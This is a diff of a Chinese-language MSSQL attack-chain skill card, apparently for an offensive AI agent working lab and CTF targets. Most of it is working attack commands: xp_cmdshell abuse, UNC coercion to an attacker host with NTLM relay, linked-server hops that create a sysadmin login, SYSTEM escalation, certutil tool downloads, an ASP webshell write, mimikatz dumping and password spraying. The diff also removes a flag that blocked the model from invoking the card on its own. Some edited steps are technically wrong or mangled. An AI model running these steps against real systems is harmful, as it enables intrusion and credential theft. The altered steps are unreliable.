@@ -1,10 +1,9 @@
 ---
 name: 'mssql-attack-chain'
-description: 'MSSQL 攻击全链：xp_cmdshell/UNC injection/linked servers/impersonation/OLE automation + 🆕Werkzeug PBKDF2 hash破解/Eighteen IMPERSONATE模式'
-disable-model-invocation: true
+description: 'MSSQL 攻击全链：xp_cmdshell/UNC injection/linked servers/impersonation/OLE automation + 🆕Werkzeug PBKDF2 hash破解/Eighteen IMPERSONATE模式/环形链接回跳提权(suser_name 逐跳验证、isremote vs is_linked 反义陷阱、嵌套 EXEC 引号翻倍)（检索词：mssql/xp_cmdshell/linked-server/impersonate/ole/unc/linked server/attack/chain/环形链接/circular link/回跳/suser_name/sp_addlinkedsrvlogin/is_linked/isremote/DISABLE TRIGGER）'
 metadata: { domain: db, tier: T2 }
 ---
-> 📌 DSH 用法：用 skill 工具按名加载本卡。
+> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。
 
 # MSSQL 完整攻击链参考
 
@@ -14,7 +13,7 @@ metadata: { domain: db, tier: T2 }
 ```bash
 # 基础扫描 - 发现 MSSQL 实例
 nxc mssql <target> -u <user> -p <pass> [-d <domain>]
-nxc mssql <target> -u <user> -p <pass> --local-auth
+nxc mssql <target> -u <user> -p <pass> --local-auth    # 🔴 非域/工作组机器【必加】→ 见 §8 认证问题
 nxc mssql <target> -u '' -p ''   # 空凭证测试
 nxc mssql <target> -u <user> -p <pass> -M mssql_priv  # 检查权限
 
@@ -25,7 +24,7 @@ nxc mssql <target> -u <user> -p <pass> -q "SELECT is_srvrolemember('sysadmin')"
 
 # 批量扫描
 nxc mssql 192.168.1.0/24 -u <user> -p <pass>
-```text
+```
 
 ### Impacket mssqlclient.py
 ```bash
@@ -40,7 +39,7 @@ mssqlclient.py <user>@<target> -hashes :<nt_hash>
 # 交互式 shell 后
 SQL> enable_xp_cmdshell
 SQL> xp_cmdshell whoami
-```text
+```
 
 ### 手工 SQL 侦查命令
 ```sql
@@ -96,7 +95,7 @@ EXEC sp_configure 'Ole Automation Procedures';
 -- 检查哪些用户有模拟权限
 SELECT * FROM sys.server_permissions 
 WHERE permission_name = 'IMPERSONATE';
-```text
+```
 
 ---
 
@@ -110,22 +109,20 @@ RECONFIGURE;
 EXEC sp_configure 'xp_cmdshell', 1;
 RECONFIGURE;
 
--- 方法2：RECONFIGURE WITH OVERRIDE（sp_configure 被策略阻止时）
-EXEC sp_configure 'show advanced options', 1;
-RECONFIGURE WITH OVERRIDE;
-EXEC sp_configure 'xp_cmdshell', 1;
-RECONFIGURE WITH OVERRIDE;
+-- 方法2：手动改配置值（绕过某些监控，直接改 sys.configurations）
+UPDATE sys.configurations SET value = 1 WHERE name = 'xp_cmdshell';
+RECONFIGURE;
 
 -- 验证
 EXEC xp_cmdshell 'whoami';
-```text
+```
 
 ### mssqlclient.py 快捷方式
-```text
+```
 SQL> enable_xp_cmdshell          # 自动启用
 SQL> xp_cmdshell whoami          # 执行命令
 SQL> xp_cmdshell powershell -enc <base64>
-```text
+```
 
 ### 常见问题
 
@@ -139,8 +136,9 @@ SQL> xp_cmdshell powershell -enc <base64>
 ### 重建 xp_cmdshell（如已被删除，需要 sysadmin）
 ```sql
 EXEC sp_addextendedproc 'xp_cmdshell', 'xplog70.dll';
--- xp_cmdshell 位于 xplog70.dll；若重建失败，确认该 DLL 存在于 Binn 目录
-```text
+-- 如果 xplog70.dll 也不存在，可尝试 xpstar.dll
+EXEC sp_addextendedproc 'xp_cmdshell', 'xpstar.dll';
+```
 
 ### xp_cmdshell 输出捕获
 ```sql
@@ -149,7 +147,26 @@ CREATE TABLE #output (result NVARCHAR(4000));
 INSERT INTO #output EXEC xp_cmdshell 'whoami';
 SELECT * FROM #output WHERE result IS NOT NULL;
 DROP TABLE #output;
-```text
+```
+
+#### 🔴🆕 xp_cmdshell → SYSTEM：输出捕获会失败，必须改成"落盘回读"（Dante 实测，踩两次才通）
+
+```
+[x] 身份：xp_cmdshell 跑在 `nt service\mssql$<实例>`（不是 SYSTEM）⇒ `whoami /priv` 有
+    SeImpersonatePrivilege + SeAssignPrimaryTokenPrivilege ⇒ Potato 家族可提权到 SYSTEM。
+[x] 🔴 提权工具的【stdout 不会被 xp_cmdshell 捕获】—— 这类工具用 CreateProcessAsUser
+    创建新进程、【不继承父进程管道】⇒ 你在结果表里只会看到一行"成功"提示，看不到命令输出。
+    ⇒ 纪律：让 SYSTEM 【把结果写文件】，再回读：
+       工具落地 → 执行 → 写 C:\Users\<任意可读目录>\out.txt → `type` 回读
+[x] 🔴 结果文件【不要写 C:\Windows\Temp】：SYSTEM 在那里创建的文件，我们的服务账号
+    读不了（Access is denied）⇒ 写 `C:\Users\` 下（本机 Users 默认可读）。
+[x] 🔴 SYSTEM 建的文件/目录，【删除也必须以 SYSTEM 身份】做（普通/服务账号删不掉）⇒
+    收尾时同样借一次提权工具去删。
+[x] 🔴 `C:\Users\<user>\Desktop\flag.txt` 对普通/服务账号 `dir` 会回
+    "File Not Found"（不是 "Access is denied"）⇒ 【别据此判定文件不存在】，那只是需要 SYSTEM。
+[x] 投递工具：复用目标机上【已在监听的 HTTP 服务】（`certutil -urlcache -split -f http://<已有服务>/…`），
+    不要为了投文件去新起端口。
+```
 
 ---
 
@@ -168,7 +185,7 @@ sudo impacket-ntlmrelayx -t smb://<target-ip> -smb2support -of hash.txt
 
 # 或中继到 LDAP
 sudo impacket-ntlmrelayx -t ldap://<dc-ip> --escalate-user <user> --delegate-access
-```text
+```
 
 ### SQL 触发命令
 ```sql
@@ -186,7 +203,7 @@ EXEC master.dbo.xp_getfiledetails '\\<attacker-ip>\share\file.txt';
 
 -- 通过 OPENROWSET（需要 ad-hoc distributed queries 开启）
 SELECT * FROM OPENROWSET('SQLNCLI', 'Server=<attacker-ip>;UID=test;PWD=test;', 'SELECT 1');
-```text
+```
 
 ### 权限要求
 - `xp_dirtree` / `xp_subdirs` / `xp_fileexist`：**PUBLIC 角色即可执行**
@@ -196,7 +213,7 @@ SELECT * FROM OPENROWSET('SQLNCLI', 'Server=<attacker-ip>;UID=test;PWD=test;', '
 ### 常见坑
 - Windows Defender / EDR 可能拦截出站 SMB
 - 如果出站 445 被防火墙阻止，尝试 139（NetBIOS）
-- MSSQL 服务账户发起 UNC 认证时：`LOCAL SYSTEM`/`NETWORK SERVICE` 用机器账户，`LOCAL SERVICE` 用匿名身份（无法捕获 NetNTLMv2），域账户用该账户
+- MSSQL 服务账户必须是 NetworkService 或域账户才能发起认证；`LOCAL SERVICE` 和 `LOCAL SYSTEM` 可能使用机器账户
 - responder 必须和 MSSQL 在同一网段或路由可达
 
 ---
@@ -218,7 +235,12 @@ SELECT * FROM sys.servers;
 
 -- 查看当前服务器上定义的远程登录映射
 EXEC sp_helplinkedsrvlogin;
-```text
+
+-- 🔴 版本陷阱：老 sysservers.isremote（1=remote / 0=linked）与新 sys.servers.is_linked
+--    （1=linked）**语义正好相反**，照抄旧资料会把"能跳的"判成"不能跳的"。SQL 2005+ 一律用：
+SELECT name, is_linked, data_source FROM sys.servers WHERE is_linked = 1;
+EXEC sp_linkedservers;   -- 等价视图
+```
 
 ### 查询链接服务器
 ```sql
@@ -235,7 +257,7 @@ SELECT * FROM OPENQUERY([LINKED_SERVER], 'SELECT name FROM sys.databases');
 -- 检查链接服务器上的权限
 SELECT * FROM OPENQUERY([LINKED_SERVER], 
   'SELECT is_srvrolemember(''sysadmin'')');
-```text
+```
 
 ### 在链接服务器上执行命令
 ```sql
@@ -250,7 +272,7 @@ EXEC sp_serveroption 'LINKED_SERVER_A', 'rpc', 'true';
 
 -- 然后在 A 上通过 EXECUTE 远程执行
 EXEC ('EXEC (''SELECT @@version'') AT [LINKED_SERVER_B]') AT [LINKED_SERVER_A];
-```text
+```
 
 ### 利用链接服务器提升权限
 ```sql
@@ -269,7 +291,31 @@ EXEC ('EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;')
   AT [LINKED_SERVER];
 EXEC ('EXEC xp_cmdshell ''powershell -enc ...''') 
   AT [LINKED_SERVER];
-```text
+```
+
+### 环形链接：跳出去再跳回来时安全上下文会变（🔴 高频且最易漏）
+
+**判定信号**：A 链到 B、**B 又链回 A**（在对端 `select srvcname,isremote from sysservers` 里看到自己）。
+此时"从 B 回跳 A"的那一跳**不保证是同一个身份**——回跳身份由链接服务器的**登录映射**决定，不同跳可能分别落在低权账号和 **sysadmin** 上。
+
+```sql
+-- ① 逐跳问"我现在是谁"（🔴 每一跳都要问，别跳完再问，否则分不清是哪一跳升的）
+SELECT SUSER_NAME();                                    -- 本地起点
+EXEC ('select SUSER_NAME()') AT [B];                     -- 一跳：B 上的身份
+EXEC ('EXEC (''select SUSER_NAME()'') AT [A]') AT [B];   -- 两跳（环形回跳）：A 上的身份 ← 关键
+
+-- ② 若回跳身份是 sysadmin，就借它在本地建一个自己的高权账号
+--    （引号按嵌套层数翻倍转义，层数写错报的是语法错、不是权限错）
+EXEC ('EXEC (''EXEC sp_addlogin ''''<u>'''', ''''<p>'''''') AT [A]') AT [B];
+EXEC ('EXEC (''EXEC sp_addsrvrolemember ''''<u>'''', ''''sysadmin'''''') AT [A]') AT [B];
+-- ③ 用新账号直连重登（此时才是"真·sysadmin"，后续 xp_cmdshell 等全开）
+```
+
+🔴 **不要背结论、要打印证据**：回跳为什么升权，取决于 `sp_helplinkedsrvlogin` / `sp_addlinkedsrvlogin`
+的 `@useself` 与对端是否缺登录映射。复现前把**每一跳的 `SUSER_NAME()` + 映射表**都落成输出。
+🔴 被服务器级触发器或 ACL 拦在半路 → `mssql-guardrail-bypass`（关触发器 / 换执行上下文）。
+
+---
 
 ### 创建链接服务器（需要 ALTER ANY SERVER 或 sysadmin）
 ```sql
@@ -285,7 +331,7 @@ EXEC sp_addlinkedsrvlogin
   @locallogin=NULL, 
   @rmtuser='sa', 
   @rmtpassword='P@ssw0rd';
-```text
+```
 
 ---
 
@@ -314,7 +360,7 @@ WHERE sp.permission_name = 'IMPERSONATE';
 -- 方法3：查看当前安全上下文
 SELECT * FROM sys.login_token;
 SELECT * FROM sys.user_token;
-```text
+```
 
 ### 执行模拟
 ```sql
@@ -335,7 +381,7 @@ USE [target_db];
 EXECUTE AS USER = 'dbo';
 SELECT USER_NAME();
 REVERT;
-```text
+```
 
 ### 🆕 Impersonation 获取密码哈希（Eighteen 模式）
 
@@ -357,7 +403,7 @@ SELECT username, password_hash FROM admins;
 
 -- 步骤5：识别哈希格式
 -- pbkdf2:sha256:N$salt$hash → Werkzeug (Flask) → hashcat -m 10900
-```text
+```
 
 ### Werkzeug PBKDF2-SHA256 哈希识别与破解
 ```bash
@@ -376,7 +422,7 @@ echo 'pbkdf2:sha256:600000$salt$hash' > hash.txt
 
 # 🆕 破解后的密码 → 立即去交互化 + 密码喷洒 WinRM
 nxc winrm dc01.htb -u users.txt -p '<cracked_pw>' --continue-on-success
-```text
+```
 
 ### 模拟数据库用户
 ```sql
@@ -385,7 +431,7 @@ USE [target_db];
 EXECUTE AS USER = 'dbo';
 SELECT USER_NAME();
 REVERT;
-```text
+```
 
 ### 利用 Trustworthy 数据库
 ```sql
@@ -404,7 +450,7 @@ EXEC sp_configure 'xp_cmdshell', 1;
 RECONFIGURE;
 GO
 EXEC sp_elevate;
-```text
+```
 
 ### 注意
 - `EXECUTE AS LOGIN` 要求有对应登录的 `IMPERSONATE` 权限
@@ -421,7 +467,7 @@ EXEC sp_configure 'show advanced options', 1;
 RECONFIGURE;
 EXEC sp_configure 'Ole Automation Procedures', 1;
 RECONFIGURE;
-```text
+```
 
 ### 通过 OLE 执行命令
 ```sql
@@ -447,7 +493,7 @@ EXEC sp_OASetProperty @sc, 'Language', 'VBScript';
 EXEC sp_OAMethod @sc, 'ExecuteStatement', NULL, 
   'CreateObject("WScript.Shell").Run "cmd /c whoami > C:\windows\temp\out2.txt", 0, True';
 EXEC sp_OADestroy @sc;
-```text
+```
 
 ### 优势
 - 不依赖 xp_cmdshell
@@ -483,7 +529,7 @@ SELECT * FROM OPENROWSET(
   BULK 'C:\Windows\repair\SAM', 
   SINGLE_BLOB
 ) AS data;
-```text
+```
 
 ### 读取文件 - fn_xe_file_target_read_file (SQL Server 2012+)
 ```sql
@@ -491,7 +537,7 @@ SELECT * FROM OPENROWSET(
 SELECT * FROM fn_xe_file_target_read_file(
   'C:\path\to\file.txt', NULL, NULL, NULL
 );
-```text
+```
 
 ### 读取文件 - sp_execute_external_script (SQL Server 2016+, 需要启用)
 ```sql
@@ -501,13 +547,13 @@ EXEC sp_execute_external_script
 import os
 print(os.popen("type C:\temp\file.txt").read())
 ';
-```text
+```
 
 ### 写文件 - OLE Automation
 ```sql
 -- 通过 FileSystemObject 写文件
 DECLARE @fso INT, @file INT, @text VARCHAR(8000);
-SET @text = '<%= Shell("cmd /c whoami") %>'; -- ASP webshell
+SET @text = '<%25= Shell("cmd /c whoami") %25>'; -- ASP webshell
 
 EXEC sp_OACreate 'Scripting.FileSystemObject', @fso OUTPUT;
 EXEC sp_OAMethod @fso, 'CreateTextFile', @file OUTPUT, 
@@ -516,19 +562,19 @@ EXEC sp_OAMethod @file, 'Write', NULL, @text;
 EXEC sp_OAMethod @file, 'Close';
 EXEC sp_OADestroy @file;
 EXEC sp_OADestroy @fso;
-```text
+```
 
 ### 写文件 - xp_cmdshell + echo
 ```sql
 -- PowerShell 写文件（更适合二进制）
 EXEC xp_cmdshell 'powershell -c "Set-Content -Path C:\temp\payload.exe -Value ([Convert]::FromBase64String(''BASE64_BLOB'')) -Encoding Byte"';
-```text
+```
 
 ### 写文件 - OPENROWSET BULK（需要目标表）
 ```sql
 -- 将文件内容首先导入表，再用 bcp 导出（间接方式）
 -- 不推荐直接用于攻击
-```text
+```
 
 ---
 
@@ -542,6 +588,8 @@ EXEC xp_cmdshell 'powershell -c "Set-Content -Path C:\temp\payload.exe -Value ([
 | `The target principal name is incorrect` | SPN 未注册或错误 | `setspn -Q MSSQLSvc/*` |
 | SQL 认证失败但 Windows 认证成功 | sa 被禁用或密码过期 | 用 Windows 认证然后启用 sa |
 | `Login failed. The login is from an untrusted domain` | 跨域信任问题 | 使用 SQL 认证或检查域信任 |
+| 🔴🆕 **`Login is from an untrusted domain… Integrated authentication`（假阴性，最贵的一个）** | 目标是 **workgroup / 非域**机器，而 `nxc mssql` **默认走 Windows/Integrated 认证** ⇒ 它拿你的域上下文去登，和你要试的那个**本地 SQL 账号毫无关系** | **加 `--local-auth`**（Dante 实测：本条把 MSSQL 整整挡住一个会话；4 个候选用户名里只有 1 个命中，且必须带这个开关才通）。**判据：目标主机名不含域名后缀 / `nxc smb` 回 workgroup ⇒ 无条件加 `--local-auth`** |
+| 🔴🆕 口令/账号看着"不对"但其实是**假阴性** | 同一台机器上**未加**认证开关时，任何用户名都会回同一句 untrusted-domain 报错 ⇒ 你无法区分"用户名错"和"开关错" | 纪律：**换用户名之前先固定认证模式**（`--local-auth` / `-windows-auth` / SQL 认证三选一明确写出），否则整个喷洒的结论都不可信 |
 
 ### 网络问题
 ```bash
@@ -555,10 +603,10 @@ nmap -sV --script ms-sql-info <target>
 
 # 出站 SMB 是否可达（UNC 注入前检查）
 nmap -p 445 <attacker-ip>   # 从目标角度检查
-```text
+```
 
 ### 权限阶梯
-```text
+```
 PUBLIC 
   -> 枚举链接服务器
   -> UNC 注入 (xp_dirtree)
@@ -573,7 +621,7 @@ sysadmin
   -> 启用 OLE Automation
   -> 执行任何系统命令
   -> 模拟任何登录
-```text
+```
 
 ### xp_cmdshell 不工作的排查
 ```sql
@@ -586,43 +634,51 @@ EXEC sp_configure 'xp_cmdshell';
 -- config_value = 0 表示禁用
 
 -- 3. 检查执行权限
-EXEC sp_helprotect 'xp_cmdshell';
+SELECT * FROM syspermissions 
+WHERE grantee = USER_ID() 
+AND object_name(id) = 'xp_cmdshell';
 
 -- 4. 检查 SQL Server 服务账户
 EXEC xp_cmdshell 'whoami';
 -- NT AUTHORITY\NETWORK SERVICE 可能有网络限制
 -- NT AUTHORITY\SYSTEM 有高权限但无网络认证能力（UNC 注入可能使用计算机账户）
-```text
+```
 
 ### xp_cmdshell 权限被拒时的替代链
-```text
+```
 xp_cmdshell 不可用:
   -> OLE Automation (sp_OACreate)
   -> CLR 程序集（需要 CREATE ASSEMBLY 权限）
   -> Agent Jobs（需要 SQLAgentUserRole）
   -> 外部脚本 (sp_execute_external_script, SQL 2016+)
   -> xp_regwrite 修改注册表（若有权限）
-```text
+
+细分两种"看起来不可用"（别混为一谈）:
+  -> 报错里带 trigger / "Attempt to ... detected": 服务器级 DDL 触发器拦的
+     → sa 可 DISABLE TRIGGER ... ON ALL SERVER，见 mssql-guardrail-bypass §A
+  -> 命令跑得起来但读文件 Access denied: 是"身份"问题不是"权限不够"
+     → 换机制=换 token（外部脚本宿主账号 ≠ 服务账号），见 mssql-guardrail-bypass §B
+```
 
 ---
 
 ## 9. Password Extraction（密码提取）
 
 ### 🆕 Werkzeug PBKDF2-SHA256 哈希 (Flask/SQLAlchemy)
-```yaml
+```
 格式: pbkdf2:sha256:<iterations>$<salt>$<hash>
 特征: 以 "pbkdf2:sha256:" 开头
 hashcat: -m 10900
 来源: Flask Werkzeug security 模块 generate_password_hash()
 典型场景: 应用数据库 admin 表密码字段
 后续: 破解后密码喷洒 AD → WinRM/SSH
-```text
+```
 
 ### 从 sys.servers 提取链接服务器凭证
 ```sql
 -- 直查询（密码通常是加密的但可解密）
 SELECT name, data_source, provider_string FROM sys.servers;
-```text
+```
 
 ### 从连接字符串中提取
 ```sql
@@ -636,7 +692,7 @@ WHERE provider_string LIKE '%Password%'
 SELECT name, 
   CAST(CAST(credential_identity AS VARBINARY(MAX)) AS VARCHAR(MAX)) 
 FROM sys.credentials;
-```text
+```
 
 ### 使用 PowerUpSQL 提取
 ```powershell
@@ -647,20 +703,20 @@ Get-SQLInstanceDomain
 # 提取链接服务器密码
 Get-SQLServerLinkCrawl -Instance <target>
 Get-SQLServerPasswordHash -Instance <target>
-```text
+```
 
 ### 从内存中提取（Mimikatz / SafetyKatz）
 ```bash
 # 在目标服务器上
 mimikatz.exe "privilege::debug" "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords"
-```text
+```
 
 ### SSIS 包密码
 ```sql
 -- 查询 SSISDB 中的连接信息
 SELECT * FROM SSISDB.internal.object_parameters 
 WHERE parameter_name LIKE '%Password%';
-```text
+```
 
 ### SQL Agent 作业中的密码
 ```sql
@@ -673,13 +729,13 @@ FROM msdb.dbo.sysjobs j
 JOIN msdb.dbo.sysjobsteps js ON j.job_id = js.job_id
 WHERE js.command LIKE '%PASSWORD%' 
    OR js.command LIKE '%pwd%';
-```text
+```
 
 ---
 
 ## Quick Reference: Attack Path Decision Tree
 
-```text
+```
 获得 SQL 认证凭据
   │
   ├─ 是 sysadmin?
@@ -699,7 +755,7 @@ WHERE js.command LIKE '%PASSWORD%'
       ├─ 扫描 MSSQL 实例 (UDP 1434)
       ├─ 爆破弱密码 (sa, sqladmin, 空密码)
       └─ Kerberos SPN 枚举 → Kerberoasting
-```text
+```
 
 ---
 
@@ -710,4 +766,4 @@ nxc mssql <target> -u <user> -p <pass> -M mssql_priv
 nxc mssql <target> -u <user> -p <pass> -M web_delivery
 nxc mssql <target> -u <user> -p <pass> -M share_enum
 nxc mssql <target> -u <user> -p <pass> --local-auth --shares
-```text
+```
